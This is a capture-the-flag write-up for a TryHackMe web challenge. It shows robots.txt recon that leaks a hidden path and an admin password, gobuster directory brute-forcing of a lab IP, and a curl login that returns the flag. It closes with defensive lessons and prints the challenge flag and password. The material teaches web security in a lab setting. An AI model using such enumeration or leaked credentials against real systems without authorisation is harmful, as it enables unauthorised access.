# Hidden Deep Into my Heart — CTF Writeup

**Platform:** TryHackMe
**Challenge:** Hidden Deep Into my Heart
**Author:** 0xb0rn3
**Flag:** `THM{l0v3_is_in_th3_r0b0ts_txt}`
**Difficulty:** Easy
**Category:** Web Exploitation

---

## Overview

A Valentine's Day themed web application called **"Love Letters Anonymous"** running on a Flask (Python/Werkzeug) backend. Intelligence hints that "Cupid may have unintentionally left vulnerabilities in the system." The goal is to breach the secret vault and retrieve the hidden flag.

| Detail | Value |
|---|---|
| Attacker | `0xb0rn3` |
| Attacker IP | `10.49.168.57` |
| Target IP | `10.49.169.158` |
| Target Port | `5000` |
| Target URL | `http://10.49.169.158:5000` |
| Flag | `THM{l0v3_is_in_th3_r0b0ts_txt}` |

---

## Enumeration

### Step 1 — Initial Recon (robots.txt)

The first step in any web assessment is checking `robots.txt`. This file is intended to instruct web crawlers which paths to avoid indexing — but it also inadvertently reveals hidden paths to attackers.

```
GET http://10.49.169.158:5000/robots.txt
```

**Response:**
```
User-agent: *
Disallow: /cupids_secret_vault/*

# cupid_arrow_2026!!!
```

Two critical pieces of information were immediately exposed:

1. **Hidden path:** `/cupids_secret_vault/` — a secret directory not linked from the main application
2. **Plaintext password:** `cupid_arrow_2026!!!` — left in a comment by the developer ("Cupid")

This is a **credential leak via robots.txt** — a severe misconfiguration.

---

### Step 2 — Navigating the Vault

With the hidden path in hand, the vault landing page was accessed:

```
GET http://10.49.169.158:5000/cupids_secret_vault/
```

The page hinted that there was more to discover beyond the landing page itself.

---

### Step 3 — Directory Brute-Force (Gobuster)

To find sub-paths beneath `/cupids_secret_vault/`, Gobuster was used with SecLists' `big.txt` wordlist:

```bash
gobuster dir \
  -u http://10.49.169.158:5000/cupids_secret_vault/ \
  -w /usr/share/seclists/Discovery/Web-Content/big.txt \
  -t 20
```

**Results:**
```
/administrator   (Status: 200) [Size: 2381]
```

An admin login panel was discovered at `/cupids_secret_vault/administrator` — hidden via security through obscurity and not linked anywhere in the application.

---

## Exploitation

### Step 4 — Admin Login (Credential Stuffing)

The admin panel at `/cupids_secret_vault/administrator` presented a standard HTML login form with `username` and `password` fields.

Using the credentials leaked in `robots.txt`:

| Field | Value |
|---|---|
| Username | `admin` |
| Password | `cupid_arrow_2026!!!` |

```bash
curl -s -X POST http://10.49.169.158:5000/cupids_secret_vault/administrator \
  --data-urlencode "username=admin" \
  --data-urlencode "password=cupid_arrow_2026!!!"
```

**Response:** Admin dashboard returned containing the flag.

---

## Flag

```
THM{l0v3_is_in_th3_r0b0ts_txt}
```

---

## Attack Chain Summary

```
robots.txt
  └─ Leaked path: /cupids_secret_vault/*
  └─ Leaked password: cupid_arrow_2026!!!
        │
        ▼
/cupids_secret_vault/
        │
        ▼ (Gobuster dir brute-force)
/cupids_secret_vault/administrator
        │
        ▼ (POST admin:cupid_arrow_2026!!!)
Admin Dashboard → FLAG
```

---

## Vulnerabilities

| # | Vulnerability | Severity | Location | Description |
|---|---|---|---|---|
| 1 | Credentials in robots.txt | **Critical** | `/robots.txt` | Admin password `cupid_arrow_2026!!!` exposed as a plaintext comment |
| 2 | Hidden admin panel (obscurity) | **High** | `/cupids_secret_vault/administrator` | Panel not linked from the app, relies solely on secrecy |
| 3 | No brute-force protection | **Medium** | `/cupids_secret_vault/administrator` | No rate limiting, CAPTCHA, or account lockout on login |
| 4 | Framework/version disclosure | **Low** | All responses | `Server: Werkzeug/3.1.5 Python/3.10.12` header reveals exact stack |
| 5 | Werkzeug console endpoint exposed | **Low** | `/console` | Debugger endpoint present (returns 400, not 404) |

---

## Tools Used

| Tool | Purpose |
|---|---|
| `curl` | HTTP requests, login form submission |
| `gobuster` | Directory brute-force enumeration |
| SecLists `big.txt` | Wordlist for directory discovery |

---

## Lessons & Takeaways

- **Never put secrets in robots.txt.** It is a public, unauthenticated file. Comments are visible to everyone.
- **Security through obscurity is not security.** Hidden paths without authentication are trivially discovered with directory brute-forcing.
- **Sensitive admin panels must be protected** with strong authentication, rate limiting, and ideally IP allowlisting.
- **Remove debug/development endpoints** (like Werkzeug's `/console`) before deploying to production.
- **Sanitize Server headers** to avoid leaking framework and language version information.

---

*Written by 0xb0rn3*
